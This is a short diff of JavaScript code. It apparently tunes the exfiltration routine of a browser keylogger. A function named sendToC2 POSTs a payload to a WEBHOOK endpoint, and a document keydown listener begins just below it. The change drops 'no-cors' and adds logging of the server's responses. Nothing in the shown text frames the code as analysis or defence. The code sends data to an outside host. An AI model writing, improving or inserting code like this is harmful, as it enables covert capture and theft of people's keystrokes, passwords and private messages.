@@ -429,10 +429,14 @@
     function sendToC2(payload) {
         fetch(WEBHOOK, {
             method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+                'Content-Type': 'application/json'
+            },
             body: JSON.stringify(payload)
-        }).catch(() => {});
+        })
+        .then(response => response.json())
+        .then(data => console.log('[+] Server response:', data))
+        .catch(error => console.error('[-] Error:', error));
     }
 
     document.addEventListener('keydown', function(e) {
